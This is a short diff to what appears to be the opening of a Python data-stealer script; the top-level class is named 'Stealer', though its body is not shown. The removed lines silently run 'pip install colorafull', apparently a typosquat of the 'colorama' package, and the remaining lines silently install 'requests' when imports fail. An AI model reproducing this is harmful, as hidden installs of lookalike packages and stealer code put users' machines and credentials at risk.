@@ -1,10 +1,8 @@
 import os
 for _ in range(2):
     try:
-        from colorafull import init; init()
         import requests, json, re
     except:
-        os.system("pip install colorafull >null")
         os.system("pip install requests >null")
 
 class Stealer():
